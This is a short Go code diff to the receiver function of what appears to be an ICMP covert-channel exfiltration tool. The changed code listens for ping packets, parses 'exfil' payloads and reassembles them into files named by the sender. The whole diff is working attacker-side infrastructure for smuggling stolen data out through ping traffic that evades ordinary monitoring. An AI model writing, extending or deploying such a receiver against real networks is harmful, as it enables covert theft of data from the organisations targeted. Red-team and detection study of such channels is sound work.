@@ -10,13 +10,15 @@ import (
 )
 
 func recv(host *string) {
-	buf := make([]byte, BUFFERSIZE)
+	buf := make([]byte, BUFFERSIZE+64)
 	socket, sockErr := icmp.ListenPacket("ip4:icmp", *host)
 	if nil != sockErr {
 		log.Fatalln(sockErr)
 		return
 	}
 	currentSeq := 0
+	var f *os.File
+	var err error
 
 	for {
 		bytesRead, source, readErr := socket.ReadFrom(buf)
@@ -75,14 +77,17 @@ func recv(host *string) {
 
 		exfilPak := parseExfil(echoPak.Data)
 		if exfilPak.first {
-			f, err := os.Open(exfilPak.filename)
+			f, err = os.Create(exfilPak.filename)
 			if nil != err {
 				log.Fatalln(err)
 			}
 			defer f.Close()
 		}
 		currentSeq++
-		fmt.Printf("%x\n", echoPak.Data)
+		f.Write(exfilPak.data)
+		if exfilPak.last {
+			break
+		}
 	}
 
 }
